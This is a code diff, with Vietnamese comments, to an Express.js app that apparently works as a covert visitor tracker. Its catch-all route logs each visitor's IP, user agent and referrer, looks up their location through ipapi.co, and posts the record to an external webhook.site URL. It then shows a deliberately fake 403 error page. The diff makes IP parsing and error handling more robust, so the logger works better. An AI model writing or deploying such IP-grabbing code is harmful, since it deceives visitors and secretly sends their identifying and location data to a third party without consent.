@@ -15,7 +15,10 @@ app.get('/admin-ninja', (req, res) => {
 });
 
 app.get('*', async (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  // ✅ Lấy IP thật từ x-forwarded-for (nếu có)
+  const rawIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ip = rawIP.split(',')[0].trim(); // chỉ lấy IP đầu tiên
+
   const userAgent = req.headers['user-agent'] || 'Unknown';
   const referrer = req.headers['referer'] || 'Direct';
 
@@ -28,24 +31,27 @@ app.get('*', async (req, res) => {
   };
 
   try {
-    // Lấy vị trí địa lý từ IP
     const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
     logData.location = geo.data;
   } catch (err) {
-    logData.location = { error: 'Không lấy được location' };
+    logData.location = {
+      ip,
+      error: true,
+      reason: 'Không xác định được vị trí từ IP'
+    };
   }
 
-  // Lưu vào bộ nhớ RAM
+  // Lưu vào log RAM
   localLogs.push(logData);
 
-  // Gửi webhook ra ngoài
+  // Gửi ra webhook ngoài
   try {
     await axios.post('https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890', logData);
   } catch (err) {
     console.error('Gửi webhook lỗi:', err.message);
   }
 
-  // Trả về trang giả lỗi 403
+  // Trả về trang giả 403
   res.status(403).sendFile(path.join(__dirname, '403.html'));
 });
 
